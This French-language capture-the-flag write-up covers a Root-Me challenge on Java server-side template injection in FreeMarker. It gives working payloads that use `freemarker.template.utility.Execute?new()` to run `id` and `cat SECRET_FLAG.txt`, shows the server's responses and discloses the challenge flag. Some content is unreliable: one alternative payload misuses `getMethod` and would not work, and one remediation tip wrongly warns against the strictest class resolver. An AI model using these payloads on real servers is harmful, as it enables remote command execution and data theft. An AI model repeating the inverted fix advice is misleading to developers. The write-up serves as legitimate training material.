# POC — Java SSTI → RCE (FreeMarker)

## Challenge
- **Plateforme** : [Root-Me](https://www.root-me.org/) — Web Serveur
- **N° Challenge** : `ch41`
- **URL** : `http://challenge01.root-me.org/web-serveur/ch41/`
- **Objectif** : Lire le fichier `SECRET_FLAG.txt` via une vulnérabilité SSTI Java
- **Flag** : `B3wareOfT3mplat3Inj3ction`

---

## 1. Détection de la SSTI

### 1.1 Test d'injection basique

Envoi d'une expression mathématique simple dans un champ utilisateur :

```
${7*7}
```

**Résultat** : Le serveur retourne `49` → La syntaxe `${...}` est interprétée.

→ **Confirmation** : Template Engine Java (FreeMarker/ Velocity / JSP EL) présent et exploitable.

### 1.2 Identification du moteur

Test de différents séparateurs :

| Payload | Résultat |
|---|---|
| `${7*7}` | `49` ✅ |
| `#{7*7}` | `#{7*7}` (non interprété) ❌ |
| `*{7*7}` | `*{7*7}` ❌ |

→ Le moteur utilise la syntaxe **FreeMarker** (ou compatible `${...}`).

---

## 2. Exploitation — RCE via FreeMarker

### 2.1 Accès aux utilitaires Java

FreeMarker expose les classes Java via la directive `${"class"?new()}` ou directement l'API de reflection.

Pour exécuter des commandes système, on utilise `freemarker.template.utility.Execute` :

```
${"freemarker.template.utility.Execute"?new()("id")}
```

**Résultat** : `uid=33(www-data) gid=33(www-data) groups=33(www-data)` ✅

→ **RCE confirmée**.

### 2.2 Lecture du flag

Commande :

```
${"freemarker.template.utility.Execute"?new()("cat SECRET_FLAG.txt")}
```

**Réponse** : `B3wareOfT3mplat3Inj3ction`

---

## 3. Payloads alternatifs (FreeMarker)

Si le premier payload est bloqué, d'autres vectors existent :

```java
// Via l'API de classe
${someObject.class.forName("java.lang.Runtime").getMethod("exec","cat SECRET_FLAG.txt")}

// Via l'objet statique
${product.getClass().getProtectionDomain().getCodeSource().getLocation().toExternalForm()}

// Via ScriptEngine (pour les versions récentes)
${"".class.forName("javax.script.ScriptEngineManager").newInstance().getEngineByName("js").eval("...")}
```

---

## 4. Recommandations de correction

Pour protéger une application FreeMarker de la SSTI :

1. **Désactiver le chargement de classes** dans la configuration :
   ```java
   Configuration cfg = new Configuration(Configuration.VERSION_2_3_31);
   cfg.setNewBuiltinClassResolver(TemplateClassResolver.SAFER_RESOLVER);
   ```

2. **Ne jamais permettre à l'utilisateur de contrôler les noms de templates** — toujours utiliser des templates statiques.

3. **Échapper les entrées utilisateur** qui apparaissent dans le template.

4. **Ne pas passer le paramètre `NewBuiltinClassResolver`** à `ALLOWS_NOTHING_RESOLVER` en production.

---

## 5. Résumé de l'attaque

```
┌─────────────┐        ┌──────────────────┐        ┌─────────────────┐
│  ${7*7} → 49 │  ──►  │ Détection SSTI   │  ──►  │ Identification  │
│  (test)      │        │                  │        │ FreeMarker      │
└─────────────┘        └──────────────────┘        └─────────────────┘
                                                          │
                                                          ▼
┌─────────────┐        ┌──────────────────┐        ┌─────────────────┐
│  Flag !     │  ◄──  │ cat SECRET_FLAG   │  ◄──  │  RCE via        │
│              │        │ .txt             │        │ Execute?new()  │
└─────────────┘        └──────────────────┘        └─────────────────┘
```
